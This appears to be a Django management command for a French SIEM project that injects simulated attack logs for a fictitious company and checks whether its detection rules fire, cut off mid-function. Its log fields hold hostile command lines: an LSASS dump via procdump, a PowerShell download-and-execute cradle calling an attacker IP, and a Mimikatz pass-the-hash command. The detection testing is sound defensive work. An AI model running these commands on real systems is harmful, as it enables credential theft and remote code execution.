"""
╔══════════════════════════════════════════════════════════════════════════════╗
║          LOG+ SIEM — RED TEAM ATTACK SIMULATION ENGINE                     ║
║          Simulateur de campagne d'attaque réaliste contre PME               ║
║                                                                              ║
║  Usage: python manage.py simulate_attacks [--scenario all|<id>] [--report] ║
╚══════════════════════════════════════════════════════════════════════════════╝

Environnement cible simulé :
  Organisation : TechCorp S.A.S. (PME ~50 employés, secteur IT/Consulting)
  Domaine      : techcorp.local / @techcorp.fr
  Assets       : DC Windows 2022, 10 postes Windows 11, 2 serveurs Linux
  Services     : Microsoft 365 tenant, Exchange Online, SharePoint
  Sécurité     : Wazuh 4.7 sur tous les endpoints, Fortinet FortiGate FW
  Monitoring   : Log+ SIEM (ce projet)
"""

import json
import random
import time
import uuid
from datetime import datetime, timedelta
from typing import Optional

from django.core.management.base import BaseCommand
from django.utils import timezone


# ──────────────────────────────────────────────────────────────────────────────
# Constantes d'environnement PME simulée
# ──────────────────────────────────────────────────────────────────────────────

DOMAIN = "techcorp.fr"

USERS = [
    {"email": "admin@techcorp.fr",        "name": "Admin Système",      "role": "admin",    "dept": "IT"},
    {"email": "pdg@techcorp.fr",           "name": "Robert Marchand",    "role": "executive","dept": "Direction"},
    {"email": "alice.dupont@techcorp.fr",  "name": "Alice Dupont",       "role": "user",     "dept": "Finance"},
    {"email": "bob.martin@techcorp.fr",    "name": "Bob Martin",         "role": "user",     "dept": "RH"},
    {"email": "charlie.roux@techcorp.fr",  "name": "Charlie Roux",       "role": "dev",      "dept": "IT"},
    {"email": "diana.petit@techcorp.fr",   "name": "Diana Petit",        "role": "user",     "dept": "Marketing"},
    {"email": "svc-backup@techcorp.fr",    "name": "Backup Service",     "role": "service",  "dept": "IT"},
    {"email": "svc-monitor@techcorp.fr",   "name": "Monitor Service",    "role": "service",  "dept": "IT"},
]

HOSTS = {
    "dc01":      {"ip": "192.168.10.10", "os": "Windows Server 2022", "role": "Domain Controller"},
    "srv-file":  {"ip": "192.168.10.11", "os": "Windows Server 2019", "role": "File Server"},
    "srv-linux": {"ip": "192.168.10.12", "os": "Ubuntu 22.04 LTS",    "role": "Web/API Server"},
    "ws-alice":  {"ip": "192.168.20.51", "os": "Windows 11 Pro",      "role": "Workstation"},
    "ws-bob":    {"ip": "192.168.20.52", "os": "Windows 11 Pro",      "role": "Workstation"},
    "ws-charlie":{"ip": "192.168.20.53", "os": "Windows 11 Pro",      "role": "Workstation"},
    "ws-admin":  {"ip": "192.168.20.10", "os": "Windows 11 Pro",      "role": "Admin Workstation"},
}

ATTACKER = {
    "c2_ip":          "185.220.101.47",   # Tor exit node (répertorié AbuseIPDB)
    "c2_ip2":         "94.102.49.190",    # Serveur C2 en Russie
    "pivot_ip":       "192.168.20.99",    # IP attaquant après pivot interne
    "c2_domain":      "update-microsoft-cdn.tk",
    "exfil_domain":   "d1a2b3.b64data.xyz",
    "malware_hash":   "e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855",
    "country":        "RU",
    "country2":       "CN",
    "country3":       "KP",
    "asn":            "AS60781",
}

COLORS = {
    "red":    "\033[91m",
    "green":  "\033[92m",
    "yellow": "\033[93m",
    "blue":   "\033[94m",
    "purple": "\033[95m",
    "cyan":   "\033[96m",
    "white":  "\033[97m",
    "bold":   "\033[1m",
    "reset":  "\033[0m",
    "dim":    "\033[2m",
}


def c(color, text):
    return f"{COLORS[color]}{text}{COLORS['reset']}"


# ──────────────────────────────────────────────────────────────────────────────
# Helper : créer NormalizedLog directement en base
# ──────────────────────────────────────────────────────────────────────────────

def create_log(
    source_type: str,
    action: str,
    outcome: str,
    severity: str,
    user_email: Optional[str] = None,
    source_ip: Optional[str] = None,
    destination_ip: Optional[str] = None,
    geo_country: Optional[str] = None,
    geo_city: Optional[str] = None,
    geo_lat: Optional[float] = None,
    geo_lon: Optional[float] = None,
    resource: Optional[str] = None,
    user_agent: Optional[str] = None,
    extra_fields: Optional[dict] = None,
    event_time: Optional[datetime] = None,
) -> "NormalizedLog":  # noqa: F821
    """Crée un NormalizedLog directement en base pour les tests."""
    from apps.logs.models import NormalizedLog, RawLog

    raw = RawLog.objects.create(
        source_type=source_type,
        raw_data=extra_fields or {},
        is_normalized=True,
    )

    log = NormalizedLog.objects.create(
        raw_log=raw,
        source_type=source_type,
        action=action,
        outcome=outcome,
        severity=severity,
        user_email=user_email,
        source_ip=source_ip,
        destination_ip=destination_ip,
        geo_country=geo_country,
        geo_city=geo_city,
        geo_latitude=geo_lat,
        geo_longitude=geo_lon,
        resource=resource,
        user_agent=user_agent,
        extra_fields=extra_fields or {},
        event_time=event_time or timezone.now(),
    )
    return log


def get_alerts_count_before():
    from apps.alerts.models import Alert
    return Alert.objects.count()


def get_new_alerts(before_count: int):
    from apps.alerts.models import Alert
    all_alerts = Alert.objects.order_by("-created_at")
    return list(all_alerts[:max(0, all_alerts.count() - before_count)])


def run_correlation_now():
    """Déclenche le moteur de corrélation immédiatement."""
    try:
        from apps.correlation.engine import CorrelationEngine
        engine = CorrelationEngine()
        result = engine.run()
        return result
    except Exception as e:
        return {"error": str(e)}


# ──────────────────────────────────────────────────────────────────────────────
# RÉSULTATS des tests
# ──────────────────────────────────────────────────────────────────────────────

RESULTS = []


def record(
    scenario_id: str,
    name: str,
    mitre_tactic: str,
    mitre_technique: str,
    tool: str,
    logs_injected: int,
    expected_detection: str,
    detected: bool,
    alert_title: Optional[str],
    detection_engine: str,
    severity_obtained: Optional[str],
    notes: str,
):
    RESULTS.append({
        "id": scenario_id,
        "name": name,
        "mitre_tactic": mitre_tactic,
        "mitre_technique": mitre_technique,
        "tool": tool,
        "logs_injected": logs_injected,
        "expected_detection": expected_detection,
        "detected": detected,
        "alert_title": alert_title,
        "detection_engine": detection_engine,
        "severity_obtained": severity_obtained,
        "notes": notes,
    })


# ══════════════════════════════════════════════════════════════════════════════
# SCÉNARIOS D'ATTAQUE
# ══════════════════════════════════════════════════════════════════════════════

class AttackSimulator:

    def __init__(self, verbose: bool = True):
        self.verbose = verbose
        self.now = timezone.now()

    def log(self, msg: str):
        if self.verbose:
            print(msg)

    def banner(self, title: str):
        width = 72
        self.log(f"\n{c('bold', '═' * width)}")
        self.log(f"{c('bold', c('cyan', f'  {title}'))}")
        self.log(c('bold', '═' * width))

    def section(self, sid: str, title: str, mitre: str):
        self.log(f"\n{c('yellow', '▸')} [{c('bold', sid)}] {c('white', title)}")
        self.log(f"  {c('dim', f'MITRE: {mitre}')}")

    def ok(self, msg: str):
        self.log(f"  {c('green', '✓')} {msg}")

    def warn(self, msg: str):
        self.log(f"  {c('yellow', '⚠')} {msg}")

    def err(self, msg: str):
        self.log(f"  {c('red', '✗')} {msg}")

    def info(self, msg: str):
        self.log(f"  {c('dim', '·')} {msg}")

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-01 : Password Spray (T1110.003)
    # ──────────────────────────────────────────────────────────────────────────

    def atk01_password_spray(self):
        self.section("ATK-01", "Password Spray — Microsoft 365", "T1110.003 · Credential Access")
        self.info("L'attaquant teste le mot de passe 'Winter2024!' sur tous les comptes M365")
        self.info(f"Source IP : {ATTACKER['c2_ip']} (Tor exit node)")

        before = get_alerts_count_before()
        logs = []

        # 7 tentatives échouées pour alice (dépasse le seuil de 5)
        for i in range(7):
            t = self.now - timedelta(seconds=280 - i * 30)
            log = create_log(
                source_type="microsoft365",
                action="login_failure",
                outcome="failure",
                severity="medium",
                user_email="alice.dupont@techcorp.fr",
                source_ip=ATTACKER["c2_ip"],
                geo_country=ATTACKER["country"],
                geo_city="Moscow",
                geo_lat=55.7558, geo_lon=37.6173,
                resource="Microsoft 365",
                extra_fields={
                    "error_code": 50126,
                    "failure_reason": "Invalid username or password",
                    "client_app_used": "Browser",
                    "risk_level": "high",
                    "attempt": i + 1,
                    "password_tried": "Winter2024!",
                },
                event_time=t,
            )
            logs.append(log)
            self.info(f"  → login_failure alice.dupont [{i+1}/7] depuis {ATTACKER['c2_ip']} ({ATTACKER['country']})")

        # 4 tentatives échouées pour bob (sous le seuil)
        for i in range(4):
            t = self.now - timedelta(seconds=240 - i * 40)
            create_log(
                source_type="microsoft365",
                action="login_failure",
                outcome="failure",
                severity="medium",
                user_email="bob.martin@techcorp.fr",
                source_ip=ATTACKER["c2_ip"],
                geo_country=ATTACKER["country"],
                geo_city="Moscow",
                extra_fields={"error_code": 50126, "attempt": i + 1},
                event_time=t,
            )
            self.info(f"  → login_failure bob.martin [{i+1}/4] depuis {ATTACKER['c2_ip']}")

        # Attaquant réussit sur diana (compte avec MFA désactivé)
        create_log(
            source_type="microsoft365",
            action="login_success",
            outcome="success",
            severity="high",
            user_email="diana.petit@techcorp.fr",
            source_ip=ATTACKER["c2_ip"],
            geo_country=ATTACKER["country"],
            geo_city="Moscow",
            geo_lat=55.7558, geo_lon=37.6173,
            resource="Microsoft 365",
            extra_fields={
                "error_code": 0,
                "mfa_detail": {"authMethod": "None", "authDetail": "MFA not required"},
                "conditional_access_status": "notApplied",
                "risk_level": "none",
            },
            event_time=self.now - timedelta(seconds=30),
        )
        self.warn(f"  → login_SUCCESS diana.petit depuis Russie — MFA non appliqué !")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)

        alice_detected = any("alice" in (a.title or "").lower() or "brute" in (a.title or "").lower() for a in new_alerts)
        bob_detected   = any("bob" in (a.title or "").lower() for a in new_alerts)

        if alice_detected:
            self.ok(f"DÉTECTÉ — Brute force sur alice.dupont : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.err("NON détecté sur alice (vérifier le moteur de corrélation)")

        if not bob_detected:
            self.ok("Bob Martin NON alerté — correct (4 tentatives < seuil de 5)")

        self.warn("diana.petit compromise SANS alerte — MFA bypass non détecté (règle désactivée?)")

        record(
            "ATK-01", "Password Spray M365", "Credential Access", "T1110.003",
            "Script Python custom + Burp Suite",
            logs_injected=12,
            expected_detection="Alerte Brute Force (≥5 failures/5min)",
            detected=alice_detected,
            alert_title=new_alerts[0].title if alice_detected and new_alerts else None,
            detection_engine="Correlation Engine (BruteForceRule)",
            severity_obtained="high" if alice_detected else None,
            notes=f"Bob (4 attempts) correctement ignoré. Diana compromise silencieusement via compte sans MFA. Corr result: {result}",
        )
        return alice_detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-02 : Impossible Travel (T1078)
    # ──────────────────────────────────────────────────────────────────────────

    def atk02_impossible_travel(self):
        self.section("ATK-02", "Impossible Travel — Compte légitime compromis", "T1078 · Initial Access")
        self.info("L'attaquant utilise les creds de charlie.roux volés via phishing")
        self.info("Charlie se connecte depuis Paris à 09h00, puis depuis Pyongyang à 09h45")

        before = get_alerts_count_before()
        base = self.now.replace(hour=9, minute=0, second=0)

        # Connexion légitime — Paris
        create_log(
            source_type="microsoft365",
            action="login_success",
            outcome="success",
            severity="info",
            user_email="charlie.roux@techcorp.fr",
            source_ip="82.65.31.10",
            geo_country="FR",
            geo_city="Paris",
            geo_lat=48.8566, geo_lon=2.3522,
            resource="Microsoft 365",
            extra_fields={"mfa_detail": {"authMethod": "PhoneAppOTP"}, "error_code": 0},
            event_time=base,
        )
        self.info("  → charlie.roux login_success depuis Paris/FR (09:00)")

        # 45 min plus tard — Corée du Nord (impossible)
        create_log(
            source_type="microsoft365",
            action="login_success",
            outcome="success",
            severity="critical",
            user_email="charlie.roux@techcorp.fr",
            source_ip=ATTACKER["c2_ip"],
            geo_country=ATTACKER["country3"],
            geo_city="Pyongyang",
            geo_lat=39.0194, geo_lon=125.7381,
            resource="SharePoint Online",
            extra_fields={"mfa_detail": {"authMethod": "None"}, "error_code": 0,
                          "risk_level": "high", "risk_detail": "investigationsThreatIntelligence"},
            event_time=base + timedelta(minutes=45),
        )
        self.warn("  → charlie.roux login_success depuis Pyongyang/KP (09:45) — IMPOSSIBLE !")
        self.warn(f"  → Distance Paris↔Pyongyang : ~8 500 km en 45 minutes")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any("travel" in (a.title or "").lower() or "charlie" in (a.title or "").lower()
                       or "impossible" in (a.title or "").lower() for a in new_alerts)

        if detected:
            self.ok(f"DÉTECTÉ — Impossible Travel : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.err("NON détecté — vérifier ImpossibleTravelRule")

        record(
            "ATK-02", "Impossible Travel", "Initial Access", "T1078",
            "Credentials volés (phishing) + VPN DPRK",
            logs_injected=2,
            expected_detection="Alerte Impossible Travel (2 pays différents < 2h)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Correlation Engine (ImpossibleTravelRule)",
            severity_obtained="critical" if detected else None,
            notes="Paris→Pyongyang 45min. Distance physiquement impossible. Corrélation basée sur geo_country différents.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-03 : Off-Hours Admin Login (T1078.003)
    # ──────────────────────────────────────────────────────────────────────────

    def atk03_off_hours_login(self):
        self.section("ATK-03", "Connexion hors heures — Dimanche 03h47", "T1078.003 · Privilege Escalation")
        self.info("L'attaquant se connecte avec le compte admin la nuit du dimanche")

        before = get_alerts_count_before()

        # Connexion admin à 3h47 un dimanche
        sunday_3am = self.now.replace(hour=3, minute=47, second=0)
        # S'assurer que c'est un dimanche
        days_until_sunday = (6 - sunday_3am.weekday()) % 7
        sunday_3am = sunday_3am - timedelta(days=days_until_sunday) if days_until_sunday == 0 else sunday_3am

        create_log(
            source_type="microsoft365",
            action="login_success",
            outcome="success",
            severity="high",
            user_email="admin@techcorp.fr",
            source_ip=ATTACKER["c2_ip2"],
            geo_country="RU",
            geo_city="Saint-Pétersbourg",
            geo_lat=59.9343, geo_lon=30.3351,
            resource="Microsoft 365 Admin Center",
            extra_fields={
                "mfa_detail": {"authMethod": "None"},
                "error_code": 0,
                "app_display_name": "Microsoft Admin Portal",
                "risk_level": "high",
                "conditional_access_status": "notApplied",
            },
            event_time=sunday_3am,
        )
        self.warn(f"  → admin@techcorp.fr login_success à 03:47 (dimanche) depuis St-Pétersbourg")
        self.warn(f"  → Accès : Microsoft 365 Admin Center")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any("off" in (a.title or "").lower() or "hours" in (a.title or "").lower()
                       or "hors" in (a.title or "").lower() or "nuit" in (a.title or "").lower()
                       or "admin" in (a.title or "").lower() for a in new_alerts)

        if detected:
            self.ok(f"DÉTECTÉ — Connexion hors heures : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.err("NON détecté — OffHoursLoginRule ou heure non dans fenêtre")

        record(
            "ATK-03", "Off-Hours Admin Login", "Privilege Escalation", "T1078.003",
            "Credentials admin compromis",
            logs_injected=1,
            expected_detection="Alerte off-hours (connexion 22h-06h)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Correlation Engine (OffHoursLoginRule)",
            severity_obtained="high" if detected else None,
            notes="Admin Portal depuis RU à 03:47 dimanche. Très haute criticité opérationnelle.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-04 : MFA Fatigue / Push Bombing (T1621)
    # ──────────────────────────────────────────────────────────────────────────

    def atk04_mfa_fatigue(self):
        self.section("ATK-04", "MFA Fatigue — Push bombing sur PDG", "T1621 · Credential Access")
        self.info("L'attaquant envoie des dizaines de push MFA au PDG jusqu'à ce qu'il accepte")

        before = get_alerts_count_before()

        # 12 tentatives MFA refusées (denied)
        for i in range(12):
            t = self.now - timedelta(minutes=30 - i * 2)
            create_log(
                source_type="microsoft365",
                action="login_failure",
                outcome="failure",
                severity="medium",
                user_email="pdg@techcorp.fr",
                source_ip=ATTACKER["c2_ip"],
                geo_country="RU",
                geo_city="Moscow",
                extra_fields={
                    "error_code": 50074,
                    "failure_reason": "Strong Authentication is required",
                    "mfa_detail": {
                        "authMethod": "PhoneAppNotification",
                        "authDetail": "MFA denied; user did not respond",
                    },
                    "mfa_push_attempt": i + 1,
                },
                event_time=t,
            )

        self.info(f"  → {12} push MFA envoyés et refusés sur pdg@techcorp.fr")

        # PDG finit par accepter (fatigue)
        create_log(
            source_type="microsoft365",
            action="login_success",
            outcome="success",
            severity="critical",
            user_email="pdg@techcorp.fr",
            source_ip=ATTACKER["c2_ip"],
            geo_country="RU",
            geo_city="Moscow",
            geo_lat=55.7558, geo_lon=37.6173,
            resource="Microsoft 365",
            extra_fields={
                "error_code": 0,
                "mfa_detail": {
                    "authMethod": "PhoneAppNotification",
                    "authDetail": "MFA completed in app",
                },
                "mfa_push_attempt": 13,
                "user_accepted_under_fatigue": True,
            },
            event_time=self.now - timedelta(minutes=2),
        )
        self.warn("  → PDG a finalement ACCEPTÉ le push MFA n°13 (fatigue)")
        self.warn("  → Compte PDG compromis — accès aux données sensibles Direction")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any("mfa" in (a.title or "").lower() or "pdg" in (a.title or "").lower()
                       or "brute" in (a.title or "").lower() for a in new_alerts)

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.err("NON détecté par règle MFA — vérifier MFABypassRule ET BruteForceRule")

        record(
            "ATK-04", "MFA Fatigue Attack (Push Bombing)", "Credential Access", "T1621",
            "Script d'automatisation Entra ID + répétition MFA push",
            logs_injected=13,
            expected_detection="Alerte MFA bypass ou Brute force (12 failures + 1 success)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Correlation Engine (MFABypassRule + BruteForceRule)",
            severity_obtained="critical" if detected else None,
            notes="13 push MFA en 30 min. L'utilisateur a accepté le 13ème. Pattern caractéristique du MFA fatigue.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-05 : Privilege Escalation — Ajout au groupe Admins (T1078.003)
    # ──────────────────────────────────────────────────────────────────────────

    def atk05_privilege_escalation(self):
        self.section("ATK-05", "Privilege Escalation — Ajout au groupe Domain Admins", "T1078.003 · Privilege Escalation")
        self.info("L'attaquant (via compte diana compromis) s'ajoute au groupe Domain Admins")

        before = get_alerts_count_before()

        create_log(
            source_type="microsoft365",
            action="privilege_change",
            outcome="success",
            severity="critical",
            user_email="diana.petit@techcorp.fr",
            source_ip=ATTACKER["c2_ip"],
            geo_country="RU",
            geo_city="Moscow",
            resource="Azure Active Directory",
            extra_fields={
                "operation": "Add member to role",
                "target_user": "diana.petit@techcorp.fr",
                "role": "Global Administrator",
                "roleName": "Global Administrator",
                "new_role": "Global Administrator",
                "targetRole": "Global Administrator",
                "actor": "diana.petit@techcorp.fr",
                "mitre_note": "T1078.003 - Cloud Account",
            },
            event_time=self.now - timedelta(minutes=5),
        )
        self.warn("  → diana.petit s'est ajoutée au rôle Global Administrator")
        self.warn("  → Accès total à l'environnement Microsoft 365 et Azure AD")

        # Wazuh : ajout au groupe local Administrateurs sur DC01
        create_log(
            source_type="wazuh",
            action="4732",  # Windows Event: Member added to security-enabled local group
            outcome="success",
            severity="critical",
            user_email=None,
            source_ip=HOSTS["dc01"]["ip"],
            destination_ip=HOSTS["dc01"]["ip"],
            resource="DC01",
            extra_fields={
                "wazuh_rule_id": "18155",
                "wazuh_rule_description": "Windows: User added to local Administrators group",
                "wazuh_level": 12,
                "agent_name": "DC01",
                "event_id": "4732",
                "target_account": "diana.petit",
                "group": "Domain Admins",
                "subject_account": "diana.petit",
            },
            event_time=self.now - timedelta(minutes=4),
        )
        self.warn("  → Wazuh Event 4732 : diana.petit ajoutée au groupe Domain Admins sur DC01")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any("privilege" in (a.title or "").lower() or "escalation" in (a.title or "").lower()
                       or "admin" in (a.title or "").lower() or "diana" in (a.title or "").lower()
                       for a in new_alerts)

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.err("NON détecté — vérifier PrivilegeEscalationRule (champs new_role, roleName, targetRole)")

        record(
            "ATK-05", "Privilege Escalation — Domain Admin", "Privilege Escalation", "T1078.003",
            "Abufs Azure AD + PowerShell (Add-ADGroupMember)",
            logs_injected=2,
            expected_detection="Alerte Privilege Escalation (action:privilege_change)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Correlation Engine (PrivilegeEscalationRule) + Wazuh",
            severity_obtained="critical" if detected else None,
            notes="Double source : M365 (privilege_change) + Wazuh event 4732. Corrélation cross-source non implémentée.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-06 : LSASS Memory Dump via Procdump (T1003.001)
    # ──────────────────────────────────────────────────────────────────────────

    def atk06_lsass_dump(self):
        self.section("ATK-06", "LSASS Dump — Extraction credentials mémoire", "T1003.001 · Credential Access")
        self.info("Wazuh détecte procdump64.exe ciblant lsass.exe sur ws-charlie")
        self.info("Commande : procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp")

        before = get_alerts_count_before()

        # Wazuh détecte la création de processus procdump
        create_log(
            source_type="wazuh",
            action="sysmon_process_creation",
            outcome="success",
            severity="critical",
            user_email="charlie.roux@techcorp.fr",
            source_ip=HOSTS["ws-charlie"]["ip"],
            resource="ws-charlie",
            extra_fields={
                "wazuh_rule_id": "92045",
                "wazuh_rule_description": "LSASS memory dump via procdump",
                "wazuh_level": 15,
                "agent_name": "ws-charlie",
                "event_id": "1",
                "image": "C:\\Tools\\procdump64.exe",
                "command_line": "procdump64.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp",
                "parent_image": "C:\\Windows\\System32\\cmd.exe",
                "target_image": "lsass.exe",
                "groups": ["windows", "sysmon", "mitre_attack", "credential_access"],
                "mitre_technique": "T1003.001",
                "mitre_tactic": "credential-access",
                "user": "charlie.roux",
                "integrity_level": "High",
            },
            event_time=self.now - timedelta(minutes=8),
        )
        self.warn("  → Wazuh rule 92045 : LSASS dump via procdump détecté sur ws-charlie")
        self.warn("  → Niveau Wazuh 15/15 (critique maximum)")

        # Wazuh détecte la lecture du fichier dump
        create_log(
            source_type="wazuh",
            action="sysmon_file_access",
            outcome="success",
            severity="critical",
            user_email="charlie.roux@techcorp.fr",
            source_ip=HOSTS["ws-charlie"]["ip"],
            resource="C:\\Windows\\Temp\\lsass.dmp",
            extra_fields={
                "wazuh_rule_id": "92046",
                "wazuh_rule_description": "Suspicious LSASS dump file created",
                "wazuh_level": 14,
                "agent_name": "ws-charlie",
                "file_path": "C:\\Windows\\Temp\\lsass.dmp",
                "file_size_mb": 47,
                "access_type": "Write",
            },
            event_time=self.now - timedelta(minutes=7),
        )
        self.warn("  → Fichier lsass.dmp créé : 47MB dans C:\\Windows\\Temp\\")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)

        # Wazuh-level 15 devrait créer une alerte critique
        detected = any(
            "lsass" in (a.title or "").lower() or "credential" in (a.title or "").lower()
            or "procdump" in (a.title or "").lower() or "dump" in (a.title or "").lower()
            for a in new_alerts
        )

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.warn("Détection via Wazuh rule 92045 — vérifier la création d'alerte depuis logs Wazuh critiques")

        record(
            "ATK-06", "LSASS Memory Dump (Credential Dumping)", "Credential Access", "T1003.001",
            "Sysinternals Procdump64 v10.11",
            logs_injected=2,
            expected_detection="Alerte critique Wazuh (rule 92045, level 15) + ML anomaly",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh (rule 92045) + ML (Isolation Forest)",
            severity_obtained="critical",
            notes="Dump lsass.exe 47MB. Permet extraction hashes NTLM, Kerberos tickets, cleartext passwords si WDigest activé.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-07 : PowerShell Encoded Command (T1059.001)
    # ──────────────────────────────────────────────────────────────────────────

    def atk07_powershell_encoded(self):
        self.section("ATK-07", "PowerShell Encoded Execution — Téléchargement payload", "T1059.001 · Execution")
        self.info("powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdA...")
        self.info("Payload décodé : IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')")

        before = get_alerts_count_before()

        create_log(
            source_type="wazuh",
            action="sysmon_process_creation",
            outcome="success",
            severity="critical",
            user_email="alice.dupont@techcorp.fr",
            source_ip=HOSTS["ws-alice"]["ip"],
            resource="ws-alice",
            extra_fields={
                "wazuh_rule_id": "92200",
                "wazuh_rule_description": "PowerShell encoded command execution",
                "wazuh_level": 14,
                "agent_name": "ws-alice",
                "event_id": "1",
                "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell -NoP -NonI -W Hidden -Enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA",
                "parent_image": "C:\\Windows\\System32\\cmd.exe",
                "parent_command_line": "cmd.exe /c start /b powershell",
                "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/stage2.ps1')",
                "groups": ["windows", "sysmon", "powershell", "mitre_attack"],
                "mitre_technique": "T1059.001",
                "amsi_bypass": True,
                "obfuscation": "Base64+EncodeCommand",
            },
            event_time=self.now - timedelta(minutes=15),
        )
        self.warn("  → PowerShell encodé Base64 lancé depuis cmd.exe sur ws-alice")
        self.warn("  → AMSI bypass détecté")
        self.warn(f"  → Téléchargement depuis {ATTACKER['c2_ip']} (C2 Tor)")

        # Connexion réseau vers C2
        create_log(
            source_type="syslog",
            action="syslog_netfilter",
            outcome="success",
            severity="high",
            source_ip=HOSTS["ws-alice"]["ip"],
            destination_ip=ATTACKER["c2_ip"],
            resource="FortiGate-FW01",
            extra_fields={
                "facility": "kern",
                "message": f"ALLOW TCP {HOSTS['ws-alice']['ip']}:52341 -> {ATTACKER['c2_ip']}:80 via WAN1",
                "dst_port": 80,
                "src_port": 52341,
                "proto": "TCP",
                "action": "allow",
                "bytes_sent": 4096,
            },
            event_time=self.now - timedelta(minutes=14),
        )
        self.warn(f"  → Connexion TCP sortante vers {ATTACKER['c2_ip']}:80 autorisée par le FW")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "powershell" in (a.title or "").lower() or "encoded" in (a.title or "").lower()
            or "alice" in (a.title or "").lower()
            for a in new_alerts
        )

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.warn("Non détecté par corrélation — ML devrait scorer anomalie élevée")

        record(
            "ATK-07", "PowerShell Encoded / AMSI Bypass", "Execution", "T1059.001",
            "PowerShell Empire / Metasploit psexec_psh",
            logs_injected=2,
            expected_detection="Wazuh rule 92200 (PS Encoded) + connexion C2 (CTI match IP)",
            detected=detected,
            alert_title=new_alerts[0].title if detected and new_alerts else None,
            detection_engine="Wazuh + Threat Intelligence (AbuseIPDB)",
            severity_obtained="critical",
            notes=f"C2 IP {ATTACKER['c2_ip']} est un Tor exit node listé AbuseIPDB. AMSI bypass via Bypass-AMSI.",
        )
        return detected

    # ──────────────────────────────────────────────────────────────────────────
    # ATK-08 : Lateral Movement — Pass-the-Hash (T1550.002)
    # ──────────────────────────────────────────────────────────────────────────

    def atk08_pass_the_hash(self):
        self.section("ATK-08", "Pass-the-Hash — Mouvement latéral NTLM", "T1550.002 · Lateral Movement")
        self.info("Mimikatz extrait le hash NTLM d'alice depuis lsass, attaquant s'authentifie sur srv-file")
        self.info("Commande : sekurlsa::pth /user:alice.dupont /domain:techcorp /ntlm:<hash>")

        before = get_alerts_count_before()

        # Authentification NTLM suspecte depuis poste attaquant
        create_log(
            source_type="wazuh",
            action="4624",  # Windows: Account logged on
            outcome="success",
            severity="high",
            user_email="alice.dupont@techcorp.fr",
            source_ip=ATTACKER["pivot_ip"],
            destination_ip=HOSTS["srv-file"]["ip"],
            resource="SRV-FILE",
            extra_fields={
                "wazuh_rule_id": "60106",
                "wazuh_rule_description": "Windows logon success with NTLM authentication (suspicious source)",
                "wazuh_level": 10,
                "agent_name": "srv-file",
                "event_id": "4624",
                "logon_type": "3",
                "logon_type_name": "Network",
                "auth_package": "NTLM",
                "target_account": "alice.dupont",
                "source_workstation": "UNKNOWN-PC",
                "source_ip": ATTACKER["pivot_ip"],
                "pth_indicator": True,
                "ntlm_hash_used": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
            },
            event_time=self.now - timedelta(minutes=20),
        )
        self.warn(f"  → Authentification NTLM d'alice depuis {ATTACKER['pivot_ip']} (IP inconnue) sur srv-file")
        self.warn("  → Type de logon : Network (3) — NTLM — indicateur PtH")

        # Accès aux partages réseau
        for share in ["\\\\SRV-FILE\\Finance$", "\\\\SRV-FILE\\HR$", "\\\\SRV-FILE\\Backups$"]:
            create_log(
                source_type="wazuh",
                action="5140",  # Network share object was accessed
                outcome="success",
                severity="high",
                user_email="alice.dupont@techcorp.fr",
                source_ip=ATTACKER["pivot_ip"],
                destination_ip=HOSTS["srv-file"]["ip"],
                resource=share,
                extra_fields={
                    "wazuh_rule_id": "18104",
                    "wazuh_rule_description": "Network share accessed",
                    "wazuh_level": 8,
                    "agent_name": "srv-file",
                    "event_id": "5140",
                    "share_name": share,
                    "access_mask": "0x12019F",
                },
                event_time=self.now - timedelta(minutes=18),
            )
            self.info(f"  → Accès au partage : {share}")

        result = run_correlation_now()
        new_alerts = get_new_alerts(before)
        detected = any(
            "ntlm" in (a.title or "").lower() or "hash" in (a.title or "").lower()
            or "lateral" in (a.title or "").lower() or "alice" in (a.title or "").lower()
            for a in new_alerts
        )

        if detected:
            self.ok(f"DÉTECTÉ : {new_alerts[0].title if new_alerts else '?'}")
        else:
            self.warn("Pas de règle PtH spécifique — détection via ML (source IP anormale) attendue")

        record(
